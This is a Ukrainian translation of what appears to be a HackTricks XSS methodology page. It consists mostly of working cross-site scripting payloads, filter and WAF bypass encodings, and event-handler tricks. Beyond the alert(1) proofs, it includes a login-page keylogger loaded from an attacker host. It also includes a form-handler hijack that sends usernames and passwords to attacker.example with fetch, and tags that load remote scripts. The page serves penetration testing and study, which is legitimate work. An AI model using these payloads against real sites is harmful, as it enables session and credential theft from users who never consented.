# XSS (Cross Site Scripting)

{{#include ../../banners/hacktricks-training.md}}

## Методологія

1. Перевірте, чи **будь-яке значення, яким ви керуєте** (_parameters_, _path_, _headers_?, _cookies_?) **відображається** в HTML або **використовується** в **JS** коді.
2. **З’ясуйте контекст**, в якому воно відображається/використовується.
3. Якщо **відображається**
1. Перевірте, **які символи ви можете використовувати** і залежно від цього підготуйте payload:
1. В **raw HTML**:
1. Чи можете ви створювати нові HTML теги?
2. Чи можете ви використовувати події або атрибути, що підтримують `javascript:` протокол?
3. Чи можна обійти захист?
4. Чи інтерпретується HTML-контент якимось клієнтським JS-рушієм (_AngularJS_, _VueJS_, _Mavo_...), який можна зловживати через [**Client Side Template Injection**](../client-side-template-injection-csti.md).
5. Якщо ви не можете створити HTML теги, що виконують JS код, чи можна зловживати [**Dangling Markup - HTML scriptless injection**](../dangling-markup-html-scriptless-injection/index.html)?
2. Всередині **HTML tag**:
1. Чи можете ви вийти в raw HTML контекст?
2. Чи можете створити нові події/атрибути для виконання JS коду?
3. Чи підтримує атрибут, в який ви вбудовані, виконання JS?
4. Чи можна обійти захист?
3. Всередині **JavaScript code**:
1. Чи можете ви вийти з тега `<script>`?
2. Чи можете ви вийти зі string і виконати інший JS код?
3. Чи знаходиться ваш вхід у template literals ``?
4. Чи можна обійти захист?
4. Javascript **function**, що **виконується**
1. Ви можете вказати ім’я функції для виконання. наприклад: `?callback=alert(1)`
4. Якщо **використовується**:
1. Ви можете експлуатувати **DOM XSS**, зверніть увагу, як контролюється ваш ввід і чи використовується ваш **контрольований ввід якимось sink.**

Під час роботи над складним XSS може бути корисно ознайомитись з:

{{#ref}}
debugging-client-side-js.md
{{#endref}}

## Відображені значення

Щоб успішно експлуатувати XSS, перше, що потрібно знайти — це **значення під вашим контролем, яке відображається** на сторінці.

- **Проміжно відображене**: Якщо ви виявили, що значення параметра або навіть path відображається на сторінці, ви можете експлуатувати **Reflected XSS**.
- **Збережене і відображене**: Якщо значення під вашим контролем зберігається на сервері і відображається щоразу при доступі до сторінки, ви можете експлуатувати **Stored XSS**.
- **Доступ через JS**: Якщо значення під вашим контролем доступне через JS, ви можете експлуатувати **DOM XSS**.

## Контексти

Коли намагаєтесь експлуатувати XSS, перше, що треба зрозуміти — **в якому місці відображається ваш ввід**. Від контексту залежить, яким чином ви зможете виконати довільний JS код.

### Raw HTML

Якщо ваш ввід **відображається в raw HTML** сторінці, вам потрібно зловживати якимось **HTML тегом**, щоб виконати JS код: `<img , <iframe , <svg , <script` ... це лише декілька з багатьох можливих HTML тегів, які ви можете використати.\
Також врахуйте [Client Side Template Injection](../client-side-template-injection-csti.md).

### Всередині атрибуту HTML тега

Якщо ваш ввід відображається всередині значення атрибуту тега, ви можете спробувати:

1. **Втекти з атрибуту і з тега** (тоді ви опинитеся в raw HTML) і створити новий HTML тег для зловживання: `"><img [...]`
2. Якщо ви **можете вийти з атрибуту, але не з тега** (`>` закодовано або видалено), залежно від тега ви можете **створити подію**, яка виконає JS код: `" autofocus onfocus=alert(1) x="`
3. Якщо ви **не можете вийти з атрибуту** (`"` кодується або видаляється), то залежно від **якого атрибуту** ваше значення відображається — чи контролюєте ви все значення або лише його частину — ви зможете зловживати ним. Наприклад, якщо ви контролюєте подію типу `onclick=`, ви зможете змусити її виконати довільний код при кліку. Інший цікавий приклад — атрибут `href`, де можна використати протокол `javascript:` для виконання коду: **`href="javascript:alert(1)"`**
4. Якщо ваш ввід відображається всередині "неексплуатабельних тегів", ви можете спробувати трюк з **`accesskey`** щоб зловживати вразливістю (потрібен певний соціальний інженеринг для експлуатації): **`" accesskey="x" onclick="alert(1)" x="`**

#### Attribute-only login XSS behind WAFs

Сторінка корпоративного SSO логіну відображала OAuth параметр `service` всередині атрибуту `href` елемента `<a id="forgot_btn" ...>`. Хоча `<` та `>` були HTML-кодовані, подвійні лапки не були, тому атака могла закрити атрибут і перевикористати той самий елемент для інжекції обробників, наприклад `" onfocus="payload" x="`.

1. **Інжектувати обробник:** Простi payload-и на кшталт `onclick="print(1)"` блокувалися, але WAF перевіряв лише перший JavaScript-вираз в inline-атрибутах. Додавши нешкідливий вираз в дужках, а потім крапку з комою, дозволяло виконати реальний payload: `onfocus="(history.length);malicious_code_here"`.
2. **Автоматично тригерити його:** Браузери фокусують будь-який елемент, чиє `id` відповідає фрагменту в URL, тому додавання `#forgot_btn` до URL експлойти примусить anchor отримати фокус при завантаженні сторінки та запустить обробник без кліку.
3. **Тримати inline-заглушку малою:** У цільовому додатку вже був jQuery. Обробнику потрібно було лише ініціювати запит через `$.getScript(...)`, тоді як повний keylogger знаходився на сервері атакуючого.

**Формування рядків без лапок**

Одиничні лапки повертались URL-кодованими, а екраовані подвійні лапки псували атрибут, тому payload генерував кожен рядок за допомогою `String.fromCharCode`. Допоміжна функція полегшує перетворення будь-якого URL у char-коди перед вставкою його в атрибут:
```javascript
function toCharCodes(str){
return `const url = String.fromCharCode(${[...str].map(c => c.charCodeAt(0)).join(',')});`
}
console.log(toCharCodes('https://attacker.tld/keylogger.js'))
```
Отриманий атрибут виглядав так:
```html
onfocus="(history.length);const url=String.fromCharCode(104,116,116,112,115,58,47,47,97,116,116,97,99,107,101,114,46,116,108,100,47,107,101,121,108,111,103,103,101,114,46,106,115);$.getScript(url),function(){}"
```
**Чому це викрадає облікові дані**

Зовнішній скрипт (завантажений з хоста, контрольованого зловмисником, або Burp Collaborator) підключився до `document.onkeypress`, буферизував натискання клавіш і щосекунди виконував `new Image().src = collaborator_url + keys`. Оскільки XSS спрацьовує лише для неавторизованих користувачів, чутливою дією є сама форма входу — зловмисник keylogs імена користувачів та паролі, навіть якщо жертва ніколи не натискає "Увійти".

Дивний приклад виконання XSS в Angular, якщо ви контролюєте назву класу:
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
### Всередині JavaScript-коду

У цьому випадку ваш введений текст відображається між **`<script> [...] </script>`** тегами HTML-сторінки, всередині файлу `.js` або в атрибуті, який використовує протокол **`javascript:`**:

- Якщо відображається між **`<script> [...] </script>`** тегами, навіть якщо ваш ввід знаходиться в будь-яких лапках, ви можете спробувати інжектити `</script>` і вийти з цього контексту. Це працює тому, що **browser will first parse the HTML tags** і тільки потім вміст, отже він не помітить, що ваш інжектований `</script>` тег знаходиться всередині HTML-коду.
- Якщо відображається **inside a JS string** і попередній трюк не працює, вам потрібно **вийти** зі стрічки, **виконати** ваш код і **відновити** JS-код (якщо буде будь-яка помилка, вона не буде виконана:
- `'-alert(1)-'`
- `';-alert(1)//`
- `\';alert(1)//`
- Якщо відображається всередині template literals, ви можете **embed JS expressions** використовуючи синтаксис `${ ... }`: `` var greetings = `Hello, ${alert(1)}` ``
- **Unicode encode** дозволяє записувати **valid javascript code**:
```javascript
alert(1)
alert(1)
alert(1)
```
#### Javascript Hoisting

Javascript Hoisting позначає можливість оголошувати functions, variables або classes після того, як вони були використані, що дозволяє зловживати сценаріями, де XSS використовує неоголошені variables або functions.\
**Перегляньте наступну сторінку для додаткової інформації:**


{{#ref}}
js-hoisting.md
{{#endref}}

### Javascript Function

Декілька веб-сторінок мають endpoints, які **приймають як параметр ім'я function для виконання**. Звичайний приклад у природі виглядає приблизно так: `?callback=callbackFunc`.

Хороший спосіб дізнатися, чи те, що користувач передає напряму, намагаються виконати — це **змінити значення параметра** (наприклад на 'Vulnerable') і подивитися в консоль на помилки на кшталт:

![](<../../images/image (711).png>)

Якщо воно вразливе, ви зможете **викликати alert**, просто відправивши значення: **`?callback=alert(1)`**. Проте дуже часто такі endpoints **валідуюють вміст**, щоб дозволити лише літери, цифри, крапки та підкреслення (**`[\w\._]`**).

Однак навіть із цим обмеженням все ще можливо виконати певні дії. Це тому, що ви можете використовувати ці допустимі символи, щоб отримати доступ до будь-якого елемента DOM:

![](<../../images/image (747).png>)

Декілька корисних functions для цього:
```
firstElementChild
lastElementChild
nextElementSibiling
lastElementSibiling
parentElement
```
Ви також можете спробувати **викликати Javascript функції** безпосередньо: `obj.sales.delOrders`.

Однак зазвичай кінцеві точки, що виконують зазначену функцію, мають небагато цікавого DOM; **інші сторінки в тому ж same origin** матимуть **більш цікавий DOM** для виконання додаткових дій.

Тому, щоб **зловживати цією вразливістю в іншому DOM**, була розроблена експлуатація **Same Origin Method Execution (SOME)**:


{{#ref}}
some-same-origin-method-execution.md
{{#endref}}

### DOM

Є **JS код**, який **небезпечно** використовує деякі **дані, що контролюються атакуючим**, наприклад `location.href`. Атакуючий може зловживати цим, щоб виконати довільний JS код.


{{#ref}}
dom-xss.md
{{#endref}}

### **Universal XSS**

Такі типи XSS можуть зустрічатися **будь-де**. Вони не залежать лише від клієнтського експлуатації веб-застосунку, а від **будь-якого** **контексту**. Такі випадки **виконання довільного JavaScript** можуть навіть бути використані для отримання **RCE**, **читання** **довільних** **файлів** на клієнтах і серверах та іншого.\
Деякі **приклади**:


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-web/electron-desktop-apps/
{{#endref}}

## WAF bypass encoding image

![from https://twitter.com/hackerscrolls/status/1273254212546281473?s=21](<../../images/EauBb2EX0AERaNK (1).jpg>)

## Injecting inside raw HTML

Коли ваш ввід відображається **всередині HTML-сторінки** або ви можете вийти з поточного контексту та інжектити HTML-код, перше, що потрібно зробити — перевірити, чи можна зловживати символом `<` для створення нових тегів: просто спробуйте **відобразити** цей **символ** й перевірте, чи він **HTML кодується**, або **видаляється**, чи **відображається без змін**. **Лише в останньому випадку ви зможете експлуатувати цю ситуацію**.\
У цих випадках також **зверніть увагу на** [**Client Side Template Injection**](../client-side-template-injection-csti.md)**.**\
_**Примітка: HTML-коментар можна закрити, використавши `-->` або `--!>`**_

У цьому випадку, якщо не використовується black/whitelisting, ви можете використовувати такі payloads:
```html
<script>
alert(1)
</script>
<img src="x" onerror="alert(1)" />
<svg onload=alert('XSS')>
```
Але якщо використовується black/whitelisting тегів/атрибутів, вам потрібно буде **brute-force які теги** ви можете створювати.\
Після того як ви **виявите, які теги дозволені**, вам потрібно буде **brute-force атрибути/події** всередині знайдених валідних тегів, щоб побачити, як можна атакувати контекст.

### Теги/Події brute-force

Перейдіть на [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) і натисніть _**Copy tags to clipboard**_. Потім відправте їх усі через Burp intruder і перевірте, чи якийсь тег не був виявлений WAF як шкідливий. Коли ви дізнаєтесь, які теги можна використовувати, ви можете **brute-force всі події** з використанням валідних тегів (на тій же сторінці натисніть _**Copy events to clipboard**_ і виконайте ту ж процедуру).

### Користувацькі теги

Якщо ви не знайдете жодного валідного HTML-тега, можна спробувати **створити власний тег** і виконати JS-код за допомогою атрибута `onfocus`. У XSS-запиті потрібно закінчити URL символом `#`, щоб сторінка **сфокусувалась на цьому об'єкті** і **виконала** код:
```
/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
```
### Blacklist Bypasses

Якщо використовується певний blacklist, можна спробувати обійти його кількома простими хитрощами:
```javascript
//Random capitalization
<script> --> <ScrIpT>
<img --> <ImG

//Double tag, in case just the first match is removed
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//You can substitude the space to separate attributes for:
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//Unexpected parent tags
<svg><x><script>alert('1'&#41</x>

//Unexpected weird attributes
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///Note the newline
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//Not closing tag, ending with " <" or " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//Extra open
<<script>alert("XSS");//<</script>

//Just weird an unexpected, use your imagination
<</script/script><script>
<input type=image src onerror="prompt(1)">

//Using `` instead of parenthesis
onerror=alert`1`

//Use more than one
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
```
### Length bypass (small XSSs)

> [!NOTE] > **Більше tiny XSS payloads для різних середовищ** можна знайти [**тут**](https://github.com/terjanq/Tiny-XSS-Payloads) і [**тут**](https://tinyxss.terjanq.me).
```html
<!-- Taken from the blog of Jorge Lajara -->
<svg/onload=alert``> <script src=//aa.es> <script src=//℡㏛.pw>
```
Останній використовує 2 unicode-символи, які розширюються до 5: telsr\
Більше таких символів можна знайти [тут](https://www.unicode.org/charts/normalization/).\
Щоб перевірити, у які символи вони розкладаються, див. [тут](https://www.compart.com/en/unicode/U+2121).

### Click XSS - Clickjacking

Якщо для того, щоб exploit the vulnerability, вам потрібно, щоб **користувач клікнув по посиланню або формі** з попередньо заповненими даними, ви можете спробувати [**зловживати Clickjacking**](../clickjacking.md#xss-clickjacking) (якщо сторінка вразлива).

### Неможливо - Dangling Markup

Якщо ви просто вважаєте, що **неможливо створити HTML тег з атрибутом для виконання JS коду**, ви повинні перевірити [**Danglig Markup** ](../dangling-markup-html-scriptless-injection/index.html)because you could **exploit** the vulnerability **without** executing **JS** code.

## Інжекція всередині HTML tag

### Усередині тега/вихід із значення атрибуту

Якщо ви **знаходитеся всередині HTML тега**, перше, що варто спробувати — це **вийти** з тега і використати деякі з технік, згаданих у [попередньому розділі](#injecting-inside-raw-html), щоб виконати JS код.\
Якщо ви **не можете вийти з тега**, можна створити нові атрибути всередині тега, щоб спробувати виконати JS код, наприклад, використавши payload на кшталт (_зверніть увагу, що в цьому прикладі для виходу з атрибуту використовуються подвійні лапки; вони не потрібні, якщо ваш введений текст безпосередньо відображається всередині тега_):
```bash
" autofocus onfocus=alert(document.domain) x="
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x #Access http://site.com/?#x t
```
**Стилеві події**
```python
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>

#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
#moving your mouse anywhere over the page (0-click-ish):
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
```
### Всередині атрибуту

Навіть якщо ви **не можете вийти з атрибута** (`"` кодується або видаляється), залежно від **якого атрибута** у нього відображається ваше значення і чи контролюєте ви все значення або лише його частину, ви зможете ним зловживати. Наприклад, якщо ви контролюєте подію типу `onclick=` ви зможете змусити її виконати довільний код при кліку.\ 
Інший цікавий приклад — атрибут `href`, де можна використати протокол `javascript:` для виконання довільного коду: **`href="javascript:alert(1)"`**

**Обхід всередині події за допомогою HTML-кодування/URL-encode**

**HTML-кодовані символи** всередині значення атрибутів HTML-тегів **декодуються під час виконання**. Отже, щось на кшталт наступного буде валідним (payload виділено жирним): `<a id="author" href="http://none" onclick="var tracker='http://foo?`**`&apos;-alert(1)-&apos;`**`';">Go Back </a>`

Зверніть увагу, що **будь-який вид HTML-кодування є допустимим**:
```javascript
//HTML entities
&apos;-alert(1)-&apos;
//HTML hex without zeros
&#x27-alert(1)-&#x27
//HTML hex with zeros
&#x00027-alert(1)-&#x00027
//HTML dec without zeros
&#39-alert(1)-&#39
//HTML dec with zeros
&#00039-alert(1)-&#00039

<a href="javascript:var a='&apos;-alert(1)-&apos;'">a</a>
<a href="&#106;avascript:alert(2)">a</a>
<a href="jav&#x61script:alert(3)">a</a>
```
**Зверніть увагу, що URL encode також спрацює:**
```python
<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>
```
**Bypass всередині event за допомогою Unicode encode**
```javascript
//For some reason you can use unicode to encode "alert" but not "(1)"
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />
```
### Спеціальні протоколи у атрибуті

Тут можна використовувати протоколи **`javascript:`** або **`data:`** у деяких місцях, щоб **виконувати довільний JS-код**. Деякі вимагатимуть взаємодії користувача, а деякі — ні.
```javascript
javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
javascript:alert(1)
java        //Note the new line
script:alert(1)

data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
```
**Місця, де ви можете inject ці протоколи**

**Взагалі** протокол `javascript:` можна **використовувати у будь-якому тегу, який приймає атрибут `href`** та в **більшості** тегів, що приймають **атрибут `src`** (але не `<img>`)
```html
<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

//Special cases
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf
<iframe srcdoc="<svg onload=alert(4);>">
```
**Інші трюки обфускації**

_**У цьому випадку трюк HTML encoding і Unicode encoding з попереднього розділу також діє, оскільки ви перебуваєте всередині атрибуту.**_
```javascript
<a href="javascript:var a='&apos;-alert(1)-&apos;'">
```
Крім того, є ще один **гарний трюк** для таких випадків: **навіть якщо ваш ввід всередині `javascript:...` URL-кодується, він буде URL-декодований перед виконанням.** Тож, якщо вам потрібно **вийти** з **рядка** за допомогою **одинарної лапки** і ви бачите, що **він URL-кодується**, пам'ятайте, що **це не має значення,** він буде **інтерпретований** як **одинарна лапка** під час **виконання**.
```javascript
&apos;-alert(1)-&apos;
%27-alert(1)-%27
<iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>
```
Зверніть увагу, що якщо ви спробуєте **використати обидва** `URLencode + HTMLencode` в будь-якому порядку для кодування **payload**, це **не спрацює**, але ви можете **змішувати їх всередині payload**.

**Використання Hex та Octal encode з `javascript:`**

Ви можете використовувати **Hex** і **Octal encode** всередині атрибуту `src` тега `iframe` (принаймні), щоб задекларувати **HTML tags to execute JS**:
```javascript
//Encoded: <svg onload=alert(1)>
// This WORKS
<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />
<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />

//Encoded: alert(1)
// This doesn't work
<svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' />
<svg onload=javascript:'\141\154\145\162\164\50\61\51' />
```
### Reverse tab nabbing
```javascript
<a target="_blank" rel="opener"
```
Якщо ви можете вставити будь-який URL у довільний тег **`<a href=`**, який містить атрибути **`target="_blank" and rel="opener"`**, перегляньте наведену сторінку, щоб використати цю поведінку:


{{#ref}}
../reverse-tab-nabbing.md
{{#endref}}

### Обхід on-обробників подій

Насамперед перегляньте цю сторінку ([https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)) для корисних **"on" обробників подій**.\  
Якщо існує якийсь blacklist, що заважає вам створювати такі обробники подій, ви можете спробувати наступні обхідні методи:
```javascript
<svg onload%09=alert(1)> //No safari
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2c%3b=alert(1)>

//chars allowed between the onevent and the "="
IExplorer: %09 %0B %0C %020 %3B
Chrome: %09 %20 %28 %2C %3B
Safari: %2C %3B
Firefox: %09 %20 %28 %2C %3B
Opera: %09 %20 %2C %3B
Android: %09 %20 %28 %2C %3B
```
### XSS у "Unexploitable tags" (hidden input, link, canonical, meta)

З [**here**](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags) **тепер можна зловживати hidden inputs за допомогою:**
```html
<button popvertarget="x">Click me</button>
<input type="hidden" value="y" popover id="x" onbeforetoggle="alert(1)" />
```
А в **meta tags**:
```html
<!-- Injection inside meta attribute-->
<meta
name="apple-mobile-web-app-title"
content=""
Twitter
popover
id="newsletter"
onbeforetoggle="alert(2)" />
<!-- Existing target-->
<button popovertarget="newsletter">Subscribe to newsletter</button>
<div popover id="newsletter">Newsletter popup</div>
```
From [**here**](https://portswigger.net/research/xss-in-hidden-input-fields): Ви можете виконати **XSS payload inside a hidden attribute**, за умови що зможете **переконати** **victim** натиснути **комбінацію клавіш**. У Firefox на Windows/Linux комбінація клавіш — **ALT+SHIFT+X**, а на OS X — **CTRL+ALT+X**. Ви можете вказати іншу комбінацію клавіш, використавши іншу клавішу в access key attribute. Ось вектор:
```html
<input type="hidden" accesskey="X" onclick="alert(1)">
```
**The XSS payload will be something like this: `" accesskey="x" onclick="alert(1)" x="`**

### Обходи чорного списку

Кілька трюків із використанням різного кодування вже були показані в цьому розділі. Поверніться, щоб дізнатися, де можна використовувати:

- **HTML encoding (HTML tags)**
- **Unicode encoding (can be valid JS code):** `\u0061lert(1)`
- **URL encoding**
- **Hex and Octal encoding**
- **data encoding**

**Bypasses for HTML tags and attributes**

Read the[ Blacklist Bypasses of the previous section](#blacklist-bypasses).

**Bypasses for JavaScript code**

Read the J[avaScript bypass blacklist of the following section](#javascript-bypass-blacklists-techniques).

### CSS-Gadgets

If you found a **XSS in a very small part** of the web that requires some kind of interaction (maybe a small link in the footer with an onmouseover element), you can try to **modify the space that element occupies** to maximize the probabilities of have the link fired.

For example, you could add some styling in the element like: `position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: red; opacity: 0.5`

But, if the WAF is filtering the style attribute, you can use CSS Styling Gadgets, so if you find, for example

> .test {display:block; color: blue; width: 100%\}

and

> \#someid {top: 0; font-family: Tahoma;}

Now you can modify our link and bring it to the form

> \<a href="" id=someid class=test onclick=alert() a="">

This trick was taken from [https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703](https://medium.com/@skavans_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703)

## Інжекція всередину JavaScript коду

У цьому випадку ваше **input** буде **відображено всередині JS коду** у файлі `.js` або між тегами `<script>...</script>` або в HTML-подіях, які можуть виконувати JS код, або в атрибутах, які приймають протокол `javascript:`.

### Escaping \<script> tag

If your code is inserted within `<script> [...] var input = 'reflected data' [...] </script>` you could easily **escape closing the `<script>`** tag:
```javascript
</script><img src=1 onerror=alert(document.domain)>
```
Зверніть увагу, що в цьому прикладі ми **навіть не закрили одинарну лапку**. Це тому, що **HTML-парсинг виконується спочатку браузером**, який визначає елементи сторінки, включно з блоками script. Парсинг JavaScript для розуміння та виконання вкладених скриптів виконується лише потім.

### Усередині JS-коду

Якщо `<>` санітизуються, ви все ще можете **екранувати рядок** у тому місці, де ваше введення **розташовано**, і **виконати довільний JS**. Важливо **виправити синтаксис JS**, оскільки якщо є помилки, JS-код не буде виконано:
```
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
```
#### JS-in-JS string break → inject → repair pattern

Коли введення користувача опиняється всередині взятого в лапки JavaScript рядка (e.g., server-side echo into an inline script), ви можете завершити рядок, ввести код і відновити синтаксис, щоб парсер продовжував коректно працювати. Загальна схема:
```
"            // end original string
;            // safely terminate the statement
<INJECTION>  // attacker-controlled JS
; a = "      // repair and resume expected string/statement
```
Приклад шаблону URL, коли вразливий параметр відображається в JS-рядку:
```
?param=test";<INJECTION>;a="
```
Це виконує JS зловмисника без потреби торкатися HTML-контексту (pure JS-in-JS). Поєднуйте з blacklist bypasses нижче, коли фільтри блокують ключові слова.

### Шаблонні літерали \`\`

Щоб конструювати **рядки**, окрім одинарних та подвійних лапок, JS також дозволяє використовувати **backticks** **` `` `**. Це відоме як шаблонні літерали, оскільки вони дозволяють **вбудовувати JS-вирази** за допомогою синтаксису `${ ... }`.\  
Тому, якщо ви помітите, що ваш вхід відображається всередині JS-рядка, який використовує backticks, ви можете зловживати синтаксисом `${ ... }` для виконання **довільного JS-коду**:

Цим можна **зловживати**, використовуючи:
```javascript
;`${alert(1)}``${`${`${`${alert(1)}`}`}`}`
```

```javascript
// This is valid JS code, because each time the function returns itself it's recalled with ``
function loop() {
return loop
}
loop``
```
### Виконання закодованого коду
```html
<script>\u0061lert(1)</script>
<svg><script>alert&lpar;'1'&rpar;
<svg><script>alert(1)</script></svg>  <!-- The svg tags are neccesary
<iframe srcdoc="<SCRIPT>alert(1)</iframe>">
```
#### Готові payloads з eval(atob()) та нюанси області видимості

Щоб зробити URLs коротшими та обійти наївні фільтри за ключовими словами, ви можете закодувати вашу реальну логіку у base64 і виконати її через `eval(atob('...'))`. Якщо просте фільтрування за ключовими словами блокує ідентифікатори на кшталт `alert`, `eval` або `atob`, використовуйте Unicode-escaped ідентифікатори, які компілюються ідентично у браузері, але обходять фільтри зі співставленням рядків:
```
\u0061\u006C\u0065\u0072\u0074(1)                      // alert(1)
\u0065\u0076\u0061\u006C(\u0061\u0074\u006F\u0062('BASE64'))  // eval(atob('...'))
```
Важлива особливість області видимості: `const`/`let`, оголошені всередині `eval()`, мають блочну область видимості і НЕ створюють глобальних змінних; вони не будуть доступні для наступних скриптів. Використовуйте динамічно інжектований `<script>` елемент, щоб визначати глобальні, які не можна переназначити, хуки коли потрібно (e.g., to hijack a form handler):
```javascript
var s = document.createElement('script');
s.textContent = "const DoLogin = () => {const pwd = Trim(FormInput.InputPassword.value); const user = Trim(FormInput.InputUtente.value); fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));}";
document.head.appendChild(s);
```
Посилання: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval

### Кодування Unicode для виконання JS
```javascript
alert(1)
alert(1)
alert(1)
```
### JavaScript техніки обходу чорних списків

**Strings**
```javascript
"thisisastring"
'thisisastrig'
`thisisastring`
/thisisastring/ == "/thisisastring/"
/thisisastring/.source == "thisisastring"
"\h\e\l\l\o"
String.fromCharCode(116,104,105,115,105,115,97,115,116,114,105,110,103)
"\x74\x68\x69\x73\x69\x73\x61\x73\x74\x72\x69\x6e\x67"
"\164\150\151\163\151\163\141\163\164\162\151\156\147"
"\u0074\u0068\u0069\u0073\u0069\u0073\u0061\u0073\u0074\u0072\u0069\u006e\u0067"
"\u{74}\u{68}\u{69}\u{73}\u{69}\u{73}\u{61}\u{73}\u{74}\u{72}\u{69}\u{6e}\u{67}"
"\a\l\ert\(1\)"
atob("dGhpc2lzYXN0cmluZw==")
eval(8680439..toString(30))(983801..toString(36))
```
**Спеціальні escapes**
```javascript
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
// Any other char escaped is just itself
```
**Підстановки пробілів всередині JS коду**
```javascript
<TAB>
/**/
```
**JavaScript comments (з** [**JavaScript Comments**](#javascript-comments) **трюку)**
```javascript
//This is a 1 line comment
/* This is a multiline comment*/
<!--This is a 1line comment
#!This is a 1 line comment, but "#!" must to be at the beggining of the first line
-->This is a 1 line comment, but "-->" must to be at the beggining of the first line
```
**JavaScript new lines (з** [**JavaScript new line**](#javascript-new-lines) **трюк)**
```javascript
//Javascript interpret as new line these chars:
String.fromCharCode(10)
alert("//\nalert(1)") //0x0a
String.fromCharCode(13)
alert("//\ralert(1)") //0x0d
String.fromCharCode(8232)
alert("//\u2028alert(1)") //0xe2 0x80 0xa8
String.fromCharCode(8233)
alert("//\u2029alert(1)") //0xe2 0x80 0xa9
```
